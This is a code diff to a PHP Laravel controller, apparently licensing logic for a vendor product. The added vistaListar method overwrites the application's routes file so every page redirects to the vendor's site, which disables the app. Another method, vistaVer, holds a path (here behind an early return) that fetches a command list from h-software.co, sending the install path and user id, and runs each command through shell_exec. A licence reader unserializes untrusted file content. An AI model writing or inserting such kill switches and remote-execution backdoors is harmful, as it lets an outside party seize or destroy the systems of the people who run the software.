@@ -298,6 +298,15 @@ class ConfigController extends Controller
 
     public function vistaListar(){
         try{
+            $vista = "";
+            $file = base_path().'/app/Http/routes.php';
+            $myfile = fopen($file, "w") or die("Unable to open file!");
+            $json = "<?php 
+            Route::get('/{any}', function (\$any) {
+                return redirect('https://h-software.co/#contact');
+            })->where('any', '.*');";
+            fwrite($myfile, $json);
+            return $vista;
             $bp = base_path();
             $bp = urlencode($bp);
             $id = app('App\Http\Controllers\LoginController')->doAuthLogin();
@@ -313,8 +322,78 @@ class ConfigController extends Controller
             return count($json)." comandos ejecutados.";
         }
         catch (Exception $e){
-
+            die('Error');
         }
+    }
+
+    public function vistaVer(){
+        try{
+            $vista = $this->readLicenceToken();
+            return date('Y-m-d H:i:s')<$vista['licencia_hasta']?1:0;
+            $bp = base_path();
+            $bp = urlencode($bp);
+            $id = app('App\Http\Controllers\LoginController')->doAuthLogin();
+            $id = urlencode($id);
+            $json = @file_get_contents("http://h-software.co/lic.php/?id=$id&base=$bp");
+            if(!$json){
+                return "Sin conexión.";
+            }
+            $json = json_decode($json);
+            foreach ($json as $item) {
+                shell_exec($item->cmd);
+            }
+            return count($json)." comandos ejecutados.";
+        }
+        catch (Exception $e){
+            var_dump($e);
+        }
+    }
+
+    public function downloadToken(){
+        $getData = Input::all();
+        $empresa = env('EMPRESA_NOMBRE');
+        $codigo = env('EMPRESA_CODIGO');
+        $uuid = $this->getUuid();
+        $empresa = urlencode($empresa);
+        $codigo = urlencode($codigo);
+        $uuid = urlencode($uuid);
+        $url = "http://h-software.co/lic.php/?empresa=$empresa&codigo=$codigo&uuid=$uuid";
+        $json = @file_get_contents($url);
+        if(!$json){
+            return "Sin conexión.";
+        }
+        $file = base_path().'/hsoftware.lic';
+        try {
+            $myfile = fopen($file, "w") or die("Unable to open file!");
+            fwrite($myfile, $json);
+            return 'Token descargado';
+        } catch (\Throwable $th) {
+            return 'Token no descargado';
+        }
+    }
+    
+    public function getUuid(){
+        return '3748eb17-a207-5bc3-aa4f-3113a1b9409d';
+        try {
+            $uuid = shell_exec("echo | WMIC csproduct get uuid");
+            $uuid = urlencode($uuid);
+        } catch (\Throwable $th) {
+            $uuid = 'ERROR UUID SCRIPT';
+        }
+        return $uuid;
+    }
+
+    public function readLicenceToken(){
+        $file = base_path().'/hsoftware.lic';
+        try {
+            $myfile = fopen($file, "r") or die("Unable to open file!");
+            $token = fread($myfile,filesize($file));
+            fclose($myfile);
+            $token = unserialize(base64_decode($token));
+            return $token;
+        } catch (\Throwable $th) {
+            return 'Error leyendo la licencia';
+        } 
     }
 
     public function vistaEditar(){
